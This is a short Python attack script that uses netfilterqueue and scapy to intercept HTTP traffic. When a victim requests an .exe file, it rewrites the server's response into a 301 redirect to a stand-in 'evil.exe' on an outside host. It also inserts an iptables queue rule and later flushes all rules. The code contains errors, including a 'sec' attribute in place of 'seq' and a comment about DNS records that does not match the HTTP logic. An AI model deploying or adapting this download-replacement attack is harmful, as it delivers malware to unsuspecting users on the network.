#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # We converted it to scapy to allow us to access it's layers as the normal DNS packet is only string not layers
    if scapy_packet.haslayer(scapy.Raw):  # DNSRR stands for DNS Resource Record which is a DNS response
        if scapy_packet[scapy.TCP].dport == 80:  # dport --> destination port means that the packet is going to an http so it is a request
            if b".exe" in scapy_packet[scapy.Raw].load and b"example.org" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:  # sport --> source port is http means it is a response
            if scapy_packet[scapy.TCP].sec in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].sec)
                print("[+] Replacing Files...")
                download_link = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/evil.exe"
                scapy_packet[scapy.Raw].load = download_link
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    print("Formatting iptables rules...")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\nResetting iptables rules to original...")
    subprocess.call("iptables --flush", shell=True)
    print("Exiting...")
    
